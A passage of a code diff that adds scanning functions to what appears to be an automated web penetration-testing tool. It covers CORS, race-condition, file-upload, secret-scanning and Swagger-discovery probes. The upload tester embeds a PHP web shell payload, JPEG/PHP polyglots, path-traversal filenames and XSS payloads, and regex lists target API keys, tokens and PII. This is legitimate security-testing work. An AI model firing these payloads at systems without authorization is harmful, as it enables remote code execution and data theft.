+                        raw_data={"poc": finding},
+                    )
+                    # Reset marker for next test
+                    page.evaluate("() => { window.__vanguard_xss = undefined; }")
+                    triggered_dialogs.clear()
+            except Exception as e:
+                logger.debug(f"DOM XSS test case error ({tc['url'][:80]}): {e}")
+
+        browser.close()
+
+    bridge.flush()
+    logger.info(f"dom_xss_test: {len(findings)} confirmed findings on {target_url}")
+    return findings
+
+
+# =============================================================================
+# Manual HTTP probing — send_http_request
+# =============================================================================
+
+def run_send_http_request(
+    method: str,
+    url: str,
+    headers_json: str,
+    body: str,
+    follow_redirects: bool,
+    bridge,
+    timeout: int = 30,
+) -> dict:
+    """Send a single custom HTTP request and return status, headers, body, and redirect chain."""
+    import json as _json
+    import re as _re
+
+    # Block private ranges — agents should use SSRF-specific tools for internal probing.
+    _private = _re.compile(
+        r"https?://(127\.|10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|"
+        r"localhost|::1|0\.0\.0\.0|0x7f|0177\.)",
+        _re.IGNORECASE,
+    )
+    if _private.search(url):
+        return {"error": "blocked: internal/loopback address not allowed via send_http_request"}
+
+    try:
+        headers = _json.loads(headers_json) if headers_json and headers_json.strip() else {}
+    except (_json.JSONDecodeError, ValueError):
+        return {"error": f"headers_json is not valid JSON: {headers_json[:200]}"}
+
+    if not _tool_available("curl"):
+        # Fallback to httpx if available
+        try:
+            import httpx
+        except ImportError:
+            return {"error": "neither curl nor httpx is available"}
+        try:
+            with httpx.Client(timeout=timeout, follow_redirects=follow_redirects, max_redirects=5) as client:
+                resp = client.request(
+                    method.upper(),
+                    url,
+                    headers=headers,
+                    content=body.encode() if body else None,
+                )
+            return {
+                "status": resp.status_code,
+                "headers": dict(resp.headers),
+                "body": resp.text[:8000],
+                "elapsed_ms": round(resp.elapsed.total_seconds() * 1000) if resp.elapsed else None,
+                "redirect_history": [str(r.url) for r in resp.history],
+            }
+        except Exception as e:
+            return {"error": str(e)}
+
+    # Build curl command
+    cmd = ["curl", "-s", "-i", "-X", method.upper(), "--max-time", str(timeout)]
+    if not follow_redirects:
+        cmd.append("--no-location")
+    else:
+        cmd += ["-L", "--max-redirs", "5"]
+    for k, v in headers.items():
+        cmd += ["-H", f"{k}: {v}"]
+    if body:
+        cmd += ["-d", body]
+    cmd.append(url)
+
+    raw = _run(cmd, timeout=timeout + 5)
+    if not raw:
+        return {"error": "empty response from curl"}
+
+    # Parse status from first line
+    lines = raw.split("\n")
+    status = None
+    for line in lines:
+        if line.startswith("HTTP/"):
+            try:
+                status = int(line.split()[1])
+            except (IndexError, ValueError):
+                pass
+            break
+
+    # Find body after double CRLF
+    separator = "\r\n\r\n" if "\r\n\r\n" in raw else "\n\n"
+    parts = raw.split(separator, 1)
+    resp_body = parts[1][:8000] if len(parts) > 1 else ""
+
+    return {
+        "status": status,
+        "raw_headers": parts[0] if parts else "",
+        "body": resp_body,
+        "url": url,
+    }
+
+
+# =============================================================================
+# CORS policy tester
+# =============================================================================
+
+def run_cors_test(target_url: str, bridge, timeout: int = 60) -> dict:
+    """Test CORS policy with attacker-controlled Origin headers."""
+    from urllib.parse import urlparse
+    import json as _json
+
+    parsed = urlparse(target_url)
+    domain = parsed.netloc or target_url
+
+    # Craft origin variants that should NOT be trusted
+    test_origins = [
+        "https://evil.com",
+        "null",
+        f"https://evil.{domain}",
+        f"https://{domain}.attacker.com",
+        f"https://not{domain}",
+        f"https://{domain}evil.com",
+    ]
+
+    issues = []
+    try:
+        import httpx
+        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
+            for origin in test_origins:
+                try:
+                    resp = client.get(target_url, headers={"Origin": origin})
+                    acao = resp.headers.get("access-control-allow-origin", "")
+                    acac = resp.headers.get("access-control-allow-credentials", "").lower()
+
+                    if not acao:
+                        continue
+
+                    vuln = None
+                    if acao == "*":
+                        vuln = "wildcard_acao"
+                    elif acao == origin:
+                        vuln = "reflected_origin"
+                    elif acao == "null" and origin == "null":
+                        vuln = "null_origin_allowed"
+
+                    if vuln:
+                        exploitable = acac == "true"
+                        severity = "high" if exploitable else "medium"
+                        issues.append({
+                            "origin_sent": origin,
+                            "acao_response": acao,
+                            "acac": acac,
+                            "issue": vuln,
+                            "exploitable": exploitable,
+                            "severity": severity,
+                            "endpoint": target_url,
+                        })
+                        if exploitable and bridge:
+                            bridge.submit_finding(
+                                host=parsed.netloc,
+                                title=f"CORS Misconfiguration — {vuln}",
+                                description=(
+                                    f"Origin '{origin}' is reflected in ACAO with "
+                                    f"Access-Control-Allow-Credentials: {acac}"
+                                ),
+                                severity=severity,
+                                confidence="confirmed",
+                                tags=["cors", "misconfiguration", "information-disclosure"],
+                                raw_data={"origin": origin, "acao": acao, "acac": acac},
+                            )
+                except Exception:
+                    continue
+    except ImportError:
+        return {"error": "httpx not available for CORS testing"}
+
+    if bridge:
+        bridge.flush()
+
+    return {
+        "target": target_url,
+        "issues": issues,
+        "count": len(issues),
+        "exploitable_count": sum(1 for i in issues if i.get("exploitable")),
+    }
+
+
+# =============================================================================
+# Race condition tester
+# =============================================================================
+
+def run_race_condition_test(
+    url: str,
+    method: str,
+    body_json: str,
+    num_concurrent: int,
+    bridge,
+    timeout: int = 30,
+) -> dict:
+    """Send N concurrent requests to a single endpoint to detect race conditions."""
+    import threading
+    import time as _time
+    import json as _json
+
+    num_concurrent = min(int(num_concurrent or 10), 20)
+    results = []
+    errors = []
+    lock = threading.Lock()
+    barrier = threading.Barrier(num_concurrent)
+
+    def send_one():
+        try:
+            barrier.wait(timeout=5)  # all threads fire at the same instant
+        except threading.BrokenBarrierError:
+            return
+
+        try:
+            import httpx
+            headers = {"Content-Type": "application/json"}
+            body_bytes = body_json.encode() if body_json and body_json.strip() else None
+            with httpx.Client(timeout=timeout) as client:
+                t0 = _time.time()
+                resp = client.request(method.upper(), url, content=body_bytes, headers=headers)
+                elapsed = _time.time() - t0
+                with lock:
+                    results.append({
+                        "status": resp.status_code,
+                        "elapsed_ms": round(elapsed * 1000),
+                        "body_sample": resp.text[:300],
+                    })
+        except Exception as e:
+            with lock:
+                errors.append(str(e))
+
+    threads = [threading.Thread(target=send_one) for _ in range(num_concurrent)]
+    for t in threads:
+        t.start()
+    for t in threads:
+        t.join(timeout=timeout + 10)
+
+    statuses = [r["status"] for r in results]
+    bodies = [r["body_sample"] for r in results]
+    unique_statuses = list(set(statuses))
+    unique_bodies = len(set(bodies))
+
+    potential_race = (
+        len(unique_statuses) > 1
+        or unique_bodies > 1
+        or (statuses.count(200) > 1 and "already" not in " ".join(bodies).lower())
+    )
+
+    return {
+        "url": url,
+        "method": method,
+        "concurrent_requests_sent": num_concurrent,
+        "responses_received": len(results),
+        "unique_status_codes": unique_statuses,
+        "unique_body_variants": unique_bodies,
+        "potential_race_condition": potential_race,
+        "responses": results,
+        "errors": errors[:5],
+        "note": "Potential race if multiple 200s with different bodies or multiple accepted states",
+    }
+
+
+# =============================================================================
+# File upload tester
+# =============================================================================
+
+def run_file_upload_test(upload_url: str, bridge, timeout: int = 120) -> dict:
+    """Test file upload endpoint with bypass payloads."""
+    import io as _io
+    import json as _json
+    from urllib.parse import urlparse
+
+    # First run nuclei file-upload templates
+    nuclei_hits = run_nuclei(
+        upload_url,
+        bridge,
+        templates="tags=file-upload,upload,unrestricted-file-upload,file-upload-bypass",
+        timeout=60,
+    )
+
+    results = []
+
+    # PHP polyglot: valid JPEG magic bytes + PHP code
+    jpeg_magic = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00"
+    php_payload = b"<?php system($_GET['cmd']); ?>"
+
+    test_cases = [
+        ("shell.php", php_payload, "application/x-php", "bare_php"),
+        ("shell.php.jpg", php_payload, "image/jpeg", "double_extension_php_jpg"),
+        ("shell.phtml", php_payload, "image/jpeg", "phtml_extension"),
+        ("shell.php5", php_payload, "image/jpeg", "php5_extension"),
+        ("shell.shtml", php_payload, "text/html", "shtml_extension"),
+        ("shell.jpg", jpeg_magic + php_payload, "image/jpeg", "polyglot_jpeg_php"),
+        ("../../../shell.txt", b"path_traversal_test", "text/plain", "path_traversal_filename"),
+        ("shell.svg", b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>', "image/svg+xml", "svg_xss"),
+        ("shell.html", b"<script>alert(document.domain)</script>", "text/html", "html_xss"),
+        ("shell.aspx", b"<%@ Page Language=\"C#\" %><%Response.Write(\"ASPX_RCE\");%>", "application/octet-stream", "aspx_extension"),
+    ]
+
+    try:
+        import httpx
+        with httpx.Client(timeout=timeout, follow_redirects=True) as client:
+            for filename, content, content_type, test_name in test_cases:
+                try:
+                    files = {"file": (filename, _io.BytesIO(content), content_type)}
+                    resp = client.post(upload_url, files=files)
+                    body = resp.text[:500]
+                    interesting = (
+                        resp.status_code in (200, 201, 202, 204)
+                        and ("success" in body.lower() or "upload" in body.lower()
+                             or "file" in body.lower() or resp.status_code == 200)
+                        and "error" not in body.lower()
+                        and "invalid" not in body.lower()
+                    )
+                    entry = {
+                        "test": test_name,
+                        "filename": filename,
+                        "content_type_sent": content_type,
+                        "status": resp.status_code,
+                        "response_sample": body,
+                        "accepted": interesting,
+                    }
+                    results.append(entry)
+                    if interesting and bridge:
+                        parsed = urlparse(upload_url)
+                        bridge.submit_finding(
+                            host=parsed.netloc,
+                            title=f"File Upload Bypass — {test_name}",
+                            description=f"Server accepted {filename} ({content_type}): HTTP {resp.status_code}",
+                            severity="high",
+                            confidence="potential",
+                            tags=["file-upload", "upload-bypass", test_name],
+                            raw_data={"filename": filename, "status": resp.status_code, "response": body},
+                        )
+                except Exception as e:
+                    results.append({"test": test_name, "error": str(e)})
+    except ImportError:
+        return {"error": "httpx not available for file upload testing", "nuclei_findings": len(nuclei_hits)}
+
+    if bridge:
+        bridge.flush()
+
+    return {
+        "upload_url": upload_url,
+        "nuclei_findings": len(nuclei_hits),
+        "upload_bypass_tests": results,
+        "accepted_count": sum(1 for r in results if r.get("accepted")),
+        "potentially_vulnerable": len(nuclei_hits) > 0 or any(r.get("accepted") for r in results),
+    }
+
+
+# =========================================================================
+# SAST (Static Application Security Testing) scanners
+# =========================================================================
+
+def run_sast_secrets(source_dir: str, bridge: Optional[ASMBridge] = None, timeout: int = 300) -> Dict[str, Any]:
+    """Scan source tree for hardcoded secrets using Gitleaks (falls back to regex grep)."""
+    source_dir = os.path.realpath(source_dir)
+    if not os.path.isdir(source_dir):
+        return {"error": f"Not a directory: {source_dir}"}
+
+    findings: List[Dict] = []
+
+    # --- Gitleaks (preferred) ---
+    if _tool_available("gitleaks"):
+        with tempfile.NamedTemporaryFile(suffix=".json", delete=False) as tf:
+            report_path = tf.name
+        try:
+            _run(
+                ["gitleaks", "detect", "--source", source_dir,
+                 "--report-format", "json", "--report-path", report_path,
+                 "--no-git", "--exit-code", "0"],
+                timeout=timeout,
+            )
+            leaks = json.loads(open(report_path).read()) if os.path.exists(report_path) else []
+            for leak in (leaks or []):
+                findings.append({
+                    "tool": "gitleaks",
+                    "rule": leak.get("RuleID", "unknown"),
+                    "file": leak.get("File", ""),
+                    "line": leak.get("StartLine", 0),
+                    "secret_snippet": (leak.get("Secret") or "")[:60] + "…",
+                    "description": leak.get("Description", ""),
+                })
+            logger.info("gitleaks: %d findings in %s", len(findings), source_dir)
+        except Exception as exc:
+            logger.warning("gitleaks run error: %s", exc)
+        finally:
+            if os.path.exists(report_path):
+                os.unlink(report_path)
+
+    # --- Fallback regex grep for common patterns ---
+    _REGEX_PATTERNS = {
+        "aws_access_key": r"AKIA[0-9A-Z]{16}",
+        "generic_api_key": r"(?i)(api[_-]?key|token)['\"]?\s*[:=]\s*['\"]([A-Za-z0-9_\-]{20,})",
+        "private_key_header": r"-----BEGIN (RSA |EC |OPENSSH |DSA )?PRIVATE KEY-----",
+        "stripe_key": r"sk_(live|test)_[A-Za-z0-9]{24,}",
+        "anthropic_key": r"sk-ant-[A-Za-z0-9\-_]{40,}",
+        "openai_key": r"sk-[A-Za-z0-9]{40,}",
+        "github_pat": r"gh[pousr]_[A-Za-z0-9]{36,}",
+        "db_password": r"(?i)(password|passwd|pwd)\s*[:=]\s*['\"]([^'\"]{6,})",
+        "db_url": r"(postgres|mysql|mongodb|redis)://[^@\s]+:[^@\s]+@",
+    }
+
+    exclude_dirs = {".git", "node_modules", "vendor", "__pycache__", ".venv", "venv"}
+    for root, dirs, files in os.walk(source_dir):
+        dirs[:] = [d for d in dirs if d not in exclude_dirs]
+        for fname in files:
+            if not any(fname.endswith(ext) for ext in (
+                ".py", ".js", ".ts", ".go", ".rb", ".java", ".php",
+                ".env", ".yml", ".yaml", ".json", ".xml", ".config",
+                ".conf", ".ini", ".toml", ".sh", ".bash",
+            )):
+                continue
+            fpath = os.path.join(root, fname)
+            try:
+                content = open(fpath, "r", errors="ignore").read()
+            except Exception:
+                continue
+            for rule_name, pattern in _REGEX_PATTERNS.items():
+                for m in re.finditer(pattern, content):
+                    lineno = content[:m.start()].count("\n") + 1
+                    # Skip obvious examples / test values
+                    snippet = m.group(0)
+                    if any(word in snippet.lower() for word in ("example", "your_key", "replace", "xxx", "yyy", "test_key")):
+                        continue
+                    # Avoid duplicate gitleaks findings
+                    rel_path = os.path.relpath(fpath, source_dir)
+                    key = f"{rel_path}:{lineno}:{rule_name}"
+                    if not any(
+                        f.get("file", "").endswith(rel_path) and f.get("line") == lineno
+                        for f in findings
+                    ):
+                        findings.append({
+                            "tool": "regex",
+                            "rule": rule_name,
+                            "file": rel_path,
+                            "line": lineno,
+                            "secret_snippet": snippet[:60] + ("…" if len(snippet) > 60 else ""),
+                        })
+
+    if bridge and findings:
+        for f in findings[:50]:
+            bridge.submit_finding(
+                host=source_dir,
+                title=f"Hardcoded Secret — {f['rule']}",
+                description=f"Found in {f['file']}:{f.get('line', '?')}",
+                severity="high",
+                confidence="potential",
+                tags=["sast", "secrets", f["rule"]],
+                raw_data=f,
+            )
+        bridge.flush()
+
+    return {
+        "source_dir": source_dir,
+        "findings": findings,
+        "count": len(findings),
+        "tool": "gitleaks+regex",
+    }
+
+
+def run_semgrep(
+    source_dir: str,
+    ruleset: str = "auto",
+    timeout: int = 600,
+) -> Dict[str, Any]:
+    """Run semgrep static analysis on source_dir with specified ruleset."""
+    source_dir = os.path.realpath(source_dir)
+    if not os.path.isdir(source_dir):
+        return {"error": f"Not a directory: {source_dir}"}
+    if not _tool_available("semgrep"):
+        return {
+            "error": "semgrep not installed. Install with: pip install semgrep",
+            "install_hint": "pip install semgrep",
+        }
+
+    cmd = [
+        "semgrep", "--config", ruleset,
+        "--json", "--no-git-ignore",
+        "--max-memory", "1024",
+        source_dir,
+    ]
+    try:
+        result = _run(cmd, timeout=timeout)
+        output = result.stdout or result.stderr or "{}"
+        data = json.loads(output)
+    except json.JSONDecodeError:
+        data = {"raw_output": (result.stdout or "")[:5000]}
+    except Exception as exc:
+        return {"error": str(exc)}
+
+    results = data.get("results", [])
+    simplified = [
+        {
+            "rule_id": r.get("check_id", ""),
+            "message": r.get("extra", {}).get("message", "")[:300],
+            "severity": r.get("extra", {}).get("severity", "INFO").lower(),
+            "file": r.get("path", ""),
+            "lines": r.get("start", {}).get("line", 0),
+            "snippet": r.get("extra", {}).get("lines", "")[:200],
+        }
+        for r in results[:100]
+    ]
+    logger.info("semgrep: %d findings in %s (ruleset: %s)", len(simplified), source_dir, ruleset)
+    return {
+        "source_dir": source_dir,
+        "ruleset": ruleset,
+        "findings": simplified,
+        "count": len(simplified),
+        "errors": [e.get("message", "") for e in data.get("errors", [])[:5]],
+    }
+
+
+def grep_source(
+    pattern: str,
+    source_dir: str,
+    file_extensions: Optional[List[str]] = None,
+    case_sensitive: bool = True,
+    max_results: int = 50,
+    timeout: int = 60,
+) -> Dict[str, Any]:
+    """Regex grep across source code files — returns file, line, and matching snippet."""
+    source_dir = os.path.realpath(source_dir)
+    if not os.path.isdir(source_dir):
+        return {"error": f"Not a directory: {source_dir}"}
+
+    extensions = file_extensions or [
+        ".py", ".js", ".ts", ".jsx", ".tsx", ".go", ".rb", ".java",
+        ".php", ".cs", ".cpp", ".c", ".h", ".rs", ".swift", ".kt",
+        ".yml", ".yaml", ".json", ".xml", ".env", ".config", ".conf",
+    ]
+
+    exclude_dirs = {".git", "node_modules", "vendor", "__pycache__", ".venv", "venv", "dist", "build"}
+    matches: List[Dict] = []
+
+    try:
+        flags = 0 if case_sensitive else re.IGNORECASE
+        compiled = re.compile(pattern, flags)
+    except re.error as exc:
+        return {"error": f"Invalid regex: {exc}"}
+
+    for root, dirs, files in os.walk(source_dir):
+        dirs[:] = [d for d in dirs if d not in exclude_dirs]
+        for fname in files:
+            if not any(fname.endswith(ext) for ext in extensions):
+                continue
+            fpath = os.path.join(root, fname)
+            try:
+                with open(fpath, "r", errors="ignore") as fh:
+                    for lineno, line in enumerate(fh, start=1):
+                        if compiled.search(line):
+                            matches.append({
+                                "file": os.path.relpath(fpath, source_dir),
+                                "line": lineno,
+                                "content": line.rstrip()[:300],
+                            })
+                            if len(matches) >= max_results:
+                                return {
+                                    "pattern": pattern,
+                                    "matches": matches,
+                                    "count": len(matches),
+                                    "truncated": True,
+                                }
+            except Exception:
+                continue
+
+    return {
+        "pattern": pattern,
+        "matches": matches,
+        "count": len(matches),
+        "truncated": False,
+    }
+
+
+# =========================================================================
+# Swagger / OpenAPI Discovery & Testing (AutoSwagger-style)
+# =========================================================================
+
+# Common spec paths probed during bruteforce discovery (mirrors autoswagger's list)
+_SWAGGER_SPEC_PATHS: List[str] = [
+    "/swagger.json", "/swagger.yaml", "/swagger.yml",
+    "/openapi.json", "/openapi.yaml", "/openapi.yml",
+    "/api/swagger.json", "/api/openapi.json", "/api/swagger.yaml",
+    "/api-docs", "/api-docs/swagger.json", "/api-docs/v1", "/api-docs/v2",
+    "/v2/api-docs", "/v3/api-docs", "/v1/api-docs",
+    "/docs/openapi.json", "/docs/swagger.json",
+    "/spec", "/spec.json", "/spec.yaml", "/spec.yml",
+    "/swagger/v1/swagger.json", "/swagger/v2/swagger.json",
+    "/swagger-ui.json", "/swagger-ui/swagger.json",
+    "/assets/swagger.json", "/static/swagger.json",
+    "/.well-known/openapi.json",
+    "/rest/swagger.json", "/rest/api-docs",
+    "/backend/swagger.json", "/internal/swagger.json",
+    "/api/v1/openapi.json", "/api/v2/openapi.json", "/api/v3/openapi.json",
+]
+
+# Swagger UI page paths used to scrape the embedded spec URL
+_SWAGGER_UI_PATHS: List[str] = [
+    "/swagger-ui", "/swagger-ui/", "/swagger-ui.html",
+    "/swagger", "/swagger/", "/docs", "/docs/",
+    "/api/docs", "/api/swagger-ui", "/api/swagger",
+    "/redoc", "/redoc/", "/api-docs", "/openapi",
+]
+
+_SWAGGER_UI_SPEC_RE = re.compile(
+    r'(?:url|spec)["\']?\s*:\s*["\']([^"\']+\.(?:json|yaml|yml)[^"\']*)["\']',
+    re.IGNORECASE,
+)
+_SWAGGER_INITIALIZER_RE = re.compile(
+    r'SwaggerUIBundle\s*\(\s*\{[^}]*url\s*:\s*["\']([^"\']+)["\']',
+    re.IGNORECASE | re.DOTALL,
+)
+
+# Common secret regexes (TruffleHog-style, adapted for response bodies)
+_SECRET_PATTERNS: Dict[str, re.Pattern] = {
+    "aws_key":         re.compile(r'AKIA[0-9A-Z]{16}'),
+    "aws_secret":      re.compile(r'(?i)aws.{0,20}secret.{0,10}["\']([A-Za-z0-9/+=]{40})["\']'),
+    "generic_api_key": re.compile(r'(?i)(?:api[_-]?key|apikey|api_secret|client_secret)["\']?\s*[=:]\s*["\']([A-Za-z0-9_\-]{20,})["\']'),
+    "bearer_token":    re.compile(r'(?i)bearer\s+([A-Za-z0-9\-_\.]{20,})'),
+    "private_key":     re.compile(r'-----BEGIN (?:RSA |EC )?PRIVATE KEY-----'),
+    "github_token":    re.compile(r'ghp_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{82}'),
+    "jwt":             re.compile(r'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}'),
+    "database_url":    re.compile(r'(?i)(?:postgres|mysql|mongodb|redis)://[^\s"\'<>]+'),
+    "slack_token":     re.compile(r'xox[baprs]-[0-9A-Za-z\-]{10,}'),
+    "stripe_key":      re.compile(r'(?:sk|pk)_(?:live|test)_[0-9a-zA-Z]{24,}'),
+}
+
+# Simple PII patterns (Presidio-style lightweight equivalents)
+_PII_PATTERNS: Dict[str, re.Pattern] = {
+    "email":       re.compile(r'\b[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Z|a-z]{2,}\b'),
+    "us_phone":    re.compile(r'\b(?:\+1[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}\b'),
+    "ssn":         re.compile(r'\b\d{3}-\d{2}-\d{4}\b'),
+    "credit_card": re.compile(r'\b(?:4[0-9]{12}(?:[0-9]{3})?|5[1-5][0-9]{14}|3[47][0-9]{13}|6011[0-9]{12})\b'),
+    "ip_internal": re.compile(r'\b(?:10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|192\.168\.)\d+\.\d+\b'),
+}
+
+
+def _parse_spec_endpoints(spec: Dict[str, Any]) -> List[Dict[str, str]]:
+    """Extract paths and methods from a parsed OpenAPI/Swagger spec dict."""
+    endpoints: List[Dict[str, str]] = []
+    paths = spec.get("paths") or {}
+    # OpenAPI 3.x has servers[], Swagger 2.x has basePath
+    base_path = spec.get("basePath", "")
+    for path, methods in paths.items():
+        if not isinstance(methods, dict):
+            continue
+        for method in ("get", "post", "put", "patch", "delete", "head", "options"):
+            if method in methods:
+                endpoints.append({
+                    "path": path,
+                    "method": method.upper(),
+                    "full_path": base_path + path if base_path and not path.startswith(base_path) else path,
+                    "operation_id": methods[method].get("operationId", ""),
+                    "summary": methods[method].get("summary", ""),
+                    "tags": ", ".join(methods[method].get("tags", [])),
+                })
+    return endpoints
+
+
+def _scan_response_for_pii_and_secrets(
+    text: str,
+) -> Dict[str, List[str]]:
+    """Scan a response body for PII and secret patterns. Returns matches per category."""
+    findings: Dict[str, List[str]] = {}
+    for name, pattern in _SECRET_PATTERNS.items():
+        hits = pattern.findall(text)
+        if hits:
+            findings[f"secret:{name}"] = list(set(str(h) for h in hits))[:5]
+    for name, pattern in _PII_PATTERNS.items():
+        hits = pattern.findall(text)
+        if hits:
+            findings[f"pii:{name}"] = list(set(str(h) for h in hits))[:5]
+    return findings
+
+
+def run_swagger_spec_discovery(
+    target_url: str,
+    bridge: ASMBridge,
+    timeout: int = 60,
+) -> Dict[str, Any]:
+    """
+    Multi-phase Swagger/OpenAPI spec discovery (AutoSwagger-style).
+
+    Phase 1: If target_url looks like a spec file, parse it directly.
+    Phase 2: Probe known Swagger UI paths and scrape embedded spec URLs from HTML/JS.
+    Phase 3: Bruteforce common spec paths on the target origin.
+
+    Returns: dict with discovered spec URLs, parsed endpoint list, and metadata.
+    """
+    import httpx
+
+    parsed_target = urlparse(target_url)
+    base_origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
+
+    discovered_specs: List[Dict[str, Any]] = []
+    candidate_spec_urls: List[str] = []
+    all_endpoints: List[Dict[str, str]] = []
+
+    headers = {
+        "User-Agent": "AegisVanguard-SwaggerProbe/1.0",
+        "Accept": "application/json, application/yaml, text/yaml, */*",
+    }
+
+    def _try_fetch_spec(url: str, client: "httpx.Client") -> Optional[Dict[str, Any]]:
+        """Attempt to fetch and parse a URL as an OpenAPI/Swagger spec. Returns parsed dict or None."""
+        try:
+            resp = client.get(url, timeout=15, follow_redirects=True)
+            if resp.status_code not in (200, 206):
+                return None
+            ct = resp.headers.get("content-type", "").lower()
+            text = resp.text.strip()
+            if not text:
+                return None
+            # Try JSON first
+            if "json" in ct or text.startswith("{") or text.startswith("["):
+                try:
+                    data = json.loads(text)
+                    if isinstance(data, dict) and (
+                        "swagger" in data or "openapi" in data or "paths" in data
+                    ):
+                        return data
+                except json.JSONDecodeError:
+                    pass
+            # Try YAML
+            if "yaml" in ct or url.endswith((".yaml", ".yml")):
+                try:
+                    import yaml  # pyyaml is in requirements.txt
+                    data = yaml.safe_load(text)
+                    if isinstance(data, dict) and (
+                        "swagger" in data or "openapi" in data or "paths" in data
+                    ):
+                        return data
+                except Exception:
+                    pass
+        except Exception:
+            pass
+        return None
+
+    def _scrape_swagger_ui_for_spec_url(url: str, client: "httpx.Client") -> Optional[str]:
+        """Fetch a Swagger UI page and extract the embedded spec URL."""
+        try:
+            resp = client.get(url, timeout=15, follow_redirects=True)
+            if resp.status_code != 200:
+                return None
+            text = resp.text
+            # Look for url: '/spec.json' or initializer patterns
+            for pattern in (_SWAGGER_UI_SPEC_RE, _SWAGGER_INITIALIZER_RE):
+                m = pattern.search(text)
+                if m:
+                    spec_path = m.group(1)
+                    if spec_path.startswith("http"):
+                        return spec_path
+                    return urljoin(base_origin, spec_path)
+            # Fallback: look for common spec href patterns in HTML
+            href_re = re.search(r'href=["\']([^"\']+(?:openapi|swagger)\.(?:json|yaml))["\']', text, re.IGNORECASE)
+            if href_re:
+                path = href_re.group(1)
+                return path if path.startswith("http") else urljoin(base_origin, path)
+        except Exception:
+            pass
+        return None
+
+    with httpx.Client(headers=headers, verify=False) as client:
+        # Phase 1: Direct spec URL if target looks like a spec file
+        lower_path = parsed_target.path.lower()
+        if any(lower_path.endswith(ext) for ext in (".json", ".yaml", ".yml")):
+            spec = _try_fetch_spec(target_url, client)
+            if spec is not None:
+                version = spec.get("openapi") or spec.get("swagger", "?")
+                info = spec.get("info") or {}
+                endpoints = _parse_spec_endpoints(spec)
+                candidate_spec_urls.append(target_url)
+                discovered_specs.append({
+                    "url": target_url,
+                    "version": version,
+                    "title": info.get("title", ""),
+                    "endpoint_count": len(endpoints),
+                    "phase": "direct",
+                })
+                all_endpoints.extend(endpoints)
+                logger.info(f"swagger_discovery: direct spec at {target_url} ({len(endpoints)} endpoints)")
+
+        # Phase 2: Swagger UI scraping
+        if not discovered_specs:
+            for ui_path in _SWAGGER_UI_PATHS:
+                ui_url = base_origin + ui_path
+                spec_url = _scrape_swagger_ui_for_spec_url(ui_url, client)
+                if spec_url and spec_url not in candidate_spec_urls:
+                    spec = _try_fetch_spec(spec_url, client)
+                    if spec is not None:
+                        version = spec.get("openapi") or spec.get("swagger", "?")
+                        info = spec.get("info") or {}
+                        endpoints = _parse_spec_endpoints(spec)
+                        candidate_spec_urls.append(spec_url)
+                        discovered_specs.append({
+                            "url": spec_url,
+                            "scraped_from": ui_url,
+                            "version": version,
+                            "title": info.get("title", ""),
+                            "endpoint_count": len(endpoints),
+                            "phase": "ui_scrape",
+                        })
+                        all_endpoints.extend(endpoints)
+                        logger.info(f"swagger_discovery: UI scrape found spec at {spec_url} ({len(endpoints)} endpoints)")
+                        break
+
+        # Phase 3: Common-path bruteforce
+        for spec_path in _SWAGGER_SPEC_PATHS:
+            spec_url = base_origin + spec_path
+            if spec_url in candidate_spec_urls:
+                continue
+            spec = _try_fetch_spec(spec_url, client)
+            if spec is not None:
+                version = spec.get("openapi") or spec.get("swagger", "?")
+                info = spec.get("info") or {}
+                endpoints = _parse_spec_endpoints(spec)
+                candidate_spec_urls.append(spec_url)
+                discovered_specs.append({
+                    "url": spec_url,
+                    "version": version,
+                    "title": info.get("title", ""),
+                    "endpoint_count": len(endpoints),
+                    "phase": "bruteforce",
+                })
+                all_endpoints.extend(endpoints)
+                logger.info(f"swagger_discovery: bruteforce found spec at {spec_url} ({len(endpoints)} endpoints)")
+                # Don't break — collect all specs
+
+    # Submit findings to ASM bridge
+    for spec_info in discovered_specs:
+        bridge.submit_finding(Finding(
+            host=parsed_target.netloc,
+            title=f"Exposed API Spec: {spec_info.get('title') or spec_info['url']}",
+            description=(
+                f"OpenAPI/Swagger spec discovered at {spec_info['url']} "
+                f"(version: {spec_info.get('version', '?')}, "
+                f"{spec_info.get('endpoint_count', 0)} endpoints documented, "
+                f"discovered via {spec_info.get('phase', 'unknown')} phase)"
+            ),
+            severity="info",
+            tool="swagger_spec_discovery",
+            url=spec_info["url"],
+        ))
+    bridge.flush()
+
+    return {
+        "success": True,
+        "specs_found": len(discovered_specs),
+        "specs": discovered_specs,
+        "spec_urls": candidate_spec_urls,
+        "endpoints": all_endpoints,
+        "endpoint_count": len(all_endpoints),
+        "target": target_url,
+        "base_origin": base_origin,
+    }
+
+
+def run_autoswagger(
+    target_url: str,
+    bridge: ASMBridge,
+    risk: bool = False,
+    all_codes: bool = False,
+    brute: bool = False,
+    rate: int = 20,
+    timeout: int = 300,
+) -> Dict[str, Any]:
+    """
+    Run AutoSwagger (intruder-io/autoswagger) against target_url.
+
+    AutoSwagger discovers OpenAPI/Swagger specs, exercises each documented
+    endpoint, and flags responses containing PII or secrets. When autoswagger
+    is not installed this function falls back to a native httpx implementation
+    that tests GET endpoints from a previously discovered spec.
+
+    Args:
+        target_url: Base URL or direct spec URL of the target API
+        risk:       Include non-GET (POST/PUT/DELETE) requests (autoswagger -risk)
+        all_codes:  Include all HTTP status codes except 401/403 (autoswagger -all)
+        brute:      Enable exhaustive parameter value testing (autoswagger -b)
+        rate:       Max requests per second (autoswagger -rate)
+        timeout:    Subprocess / overall timeout in seconds
+    """
+    import httpx
+
+    parsed_target = urlparse(target_url)
+    base_origin = f"{parsed_target.scheme}://{parsed_target.netloc}"
+    host = parsed_target.netloc
+
+    # Try autoswagger CLI first (subprocess approach, consistent with other tools)
+    autoswagger_bin = shutil.which("autoswagger") or shutil.which("autoswagger.py")
+    if autoswagger_bin is None:
+        # Try well-known install location
+        for candidate in [
+            "/opt/autoswagger/autoswagger.py",
+            "/usr/local/lib/autoswagger/autoswagger.py",
+            os.path.expanduser("~/autoswagger/autoswagger.py"),
+        ]:
+            if os.path.isfile(candidate):
